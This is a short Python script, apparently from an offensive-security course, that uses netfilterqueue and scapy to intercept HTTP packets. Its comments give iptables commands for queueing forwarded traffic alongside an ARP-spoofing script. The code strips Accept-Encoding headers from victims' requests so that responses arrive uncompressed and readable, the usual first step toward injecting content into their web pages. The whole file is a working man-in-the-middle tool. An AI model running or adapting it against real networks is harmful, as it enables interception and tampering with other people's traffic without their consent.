#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re
# First:
# iptables -I FORWARD -j NFQUEUE --queue-num 0  --> for mitm and with arp_spoof.py
# iptables -I OUTPUT -j NFQUEUE --queue-num 0   --> own computer
# iptables -I INPUT -j NFQUEUE --queue-num 0    --> own computer
# iptables flush  --> back to normal


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    # Converting packet to a scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):      
        if scapy_packet[scapy.TCP].dport == 80:      
            print("[+] Request")
            # Delete Accept-Encoding and its content
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n","", scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            print(scapy_packet.show())
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()